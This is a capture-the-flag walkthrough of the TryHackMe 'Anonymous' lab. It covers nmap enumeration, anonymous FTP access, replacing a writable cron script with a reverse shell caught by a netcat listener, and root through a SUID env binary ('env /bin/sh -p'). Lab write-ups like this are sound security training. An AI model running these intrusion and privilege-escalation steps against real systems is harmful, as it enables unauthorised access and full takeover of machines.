A medium marked room, but is an easy room

Machine enumeration:
```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ sudo nmap -sS 10.10.137.196 > open_ports.txt                       
[sudo] password for kali: 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ cat open_ports.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 14:35 IST
Nmap scan report for 10.10.137.196
Host is up (0.46s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 4.86 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ sudo nmap -sS -sV -sC -O -Pn -p21,22,139,445 10.10.137.196 > ports_scan.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ cat ports_scan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-14 14:36 IST
Nmap scan report for 10.10.137.196
Host is up (0.47s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.4.101.169
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-10-14T09:06:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-10-14T09:06:52+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds
```

FTP, with Anonymous login, SSH, and SMB services running.

Connecting to the FTP port with the Anonymous login.

```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ ftp 10.10.137.196 -a                                                                          
Connected to 10.10.137.196.
220 NamelessOne's FTP Server!
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||60186|)
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
```

777 permission for the scripts folder.

```
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||53163|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1075 Oct 14 09:09 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

Copied the files to my machine using the `get` command. Then I looked for the shares in the SMB server

```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ smbclient -L //10.10.137.196
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
```

I was able to connect to the pics share. I downloaded the 2 images. The images were of some cute Corgis.

```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ cat clean.sh      
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
...
```

```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ cat to_do.txt        
I really need to disable the anonymous login...it's really not safe
```

This is the content of the files obtained from the FTP server.

I can upload a file to the server. So I changed the content of the clean.sh file, with a reverse bash script and uploaded it to the server.

```
ftp> put clean.sh 
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||36306|)
150 Ok to send data.
100% |****************************************************************************************************|    56      329.44 KiB/s    00:00 ETA
226 Transfer complete.
56 bytes sent in 00:01 (0.04 KiB/s)
```

I obtained a NetCat listener on my machine and I got the shell after a while.

```
┌──(kali㉿kali)-[~/Desktop/THM/Anonymous]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.4.101.169] from (UNKNOWN) [10.10.137.196] 53214
bash: cannot set terminal process group (1545): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ 
```

Next for privilege escalation, I checked for the files with SUID bit set. The 'env' binary has the SUID bit set. In GTFOBins, the command is there for privilege escalation for this binary

```
namelessone@anonymous:~$ /usr/bin/./env /bin/sh -p
# whoami
root
```

Hence the way to obtain the root shell.
